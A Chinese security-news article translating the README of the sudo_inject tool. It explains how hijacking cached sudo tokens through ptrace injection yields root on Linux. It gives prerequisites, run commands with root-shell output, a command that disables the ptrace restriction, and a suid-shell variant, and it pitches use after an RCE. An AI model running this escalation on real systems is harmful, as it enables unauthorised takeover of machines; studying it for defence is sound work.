![利用sudo
token实现提权](https://image.3001.net/images/20190422/1555902304_5cbd2f60f0bdd.png!small)

## 技术介绍

**我们在进行技术研究的过程中，发现有些时候sudo并不会要求我们输入密码，因为它“记得”我们。那么它为什么会“记得”我们呢？它怎么识别我们的身份呢？我们能伪造自己的身份并拿到root权限吗？**

实际上，sudo会在/var/run/sudo/ts/[username]目录中为每一位Linux用户创建一个单独的文件，这种文件中包含了身份认证成功与失败的相关信息。接下来，sudo会使用这些文件来记录所有的身份认证过程。

## 如何利用系统中的漏洞？

    
    
    $sudo whatever
    [sudo]password for user:    # Press<ctrl>+c since you don't have the password. # This creates an invalidsudo tokens.
    $ sh exploit.sh
    ....wait 1 seconds
    $sudo -i # no password required :)
    # id
    uid=0(root)gid=0(root) groups=0(root)

### 实现要求

> 1、 完全启用Ptrace（/proc/sys/kernel/yama/ptrace_scope == 0）；
>
> 2、 当前用户必须开启一个拥有有效sudo令牌并且相同uid的活动进程；

注：默认密码的超时时间为15分钟，如果你在15分钟内使用sudo两次，系统就不会要求你再输入用户的sudo密码了。

### 工作机制

项目目录中的Exploit.sh会向当前用户的所有进程注入Shell代码，并使用它们的sudo令牌来验证我们自己的sudo口令。仅需三行Shell代码，一切皆有可能。

## 使用样例

假设，你拿到了一个RCE，而且没有用户密码，但目标用户使用了sudo，那么你就可以通过窃取他的sudo令牌来实现提权啦！

如何在实验环境中模拟？

    
    
    #echo 0 > /proc/sys/kernel/yama/ptrace_scope
    # #Don't worry this is not persistent accross reboot

打开两个终端窗口：

> 1、 其中一个执行sudo命令，然后输入正确的用户密（sudo ls）；
>
> 2、 另一个按照上述方法执行漏洞利用代码；

## 使用exploit_v2.sh在/tmp/sh中创建一个suid sh

如果exploit_v1无法成功的话，大家可以尝试一下exploit_v2.sh：

    
    
    $./exploit_v2.sh
    Currentprocess : 2441
    chmod:changing permissions of 'activate_sudo_token': Operation not permitted
    Injectingprocess 1721 -> bash
    Injectingprocess 2433 -> bash
    cat:/proc/2446/comm: No such file or directory
    Injectingprocess 2446 ->
    $/tmp/sh -p
    # id
    uid=1001(test)gid=1001(test) euid=0(root) egid=0(root) groups=0(root),1001(test)

## 参考链接

> 1、 <https://www.redhat.com/archives/axp-list/2001-January/msg00355.html>
>
> 2、 <https://www.sudo.ws/man/1.8.25/sudoers_timestamp.man.html>
>
> 3、 <https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-> code-injection-without-ptrace2.html>
>
> 4、 <https://blog.habets.se/2009/03/Moving-a-process-to-another-> terminal.html>
>
> 5、 <https://www.linusakesson.net/programming/tty/>

***
参考来源：[nongiach](https://github.com/nongiach/sudo_inject)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

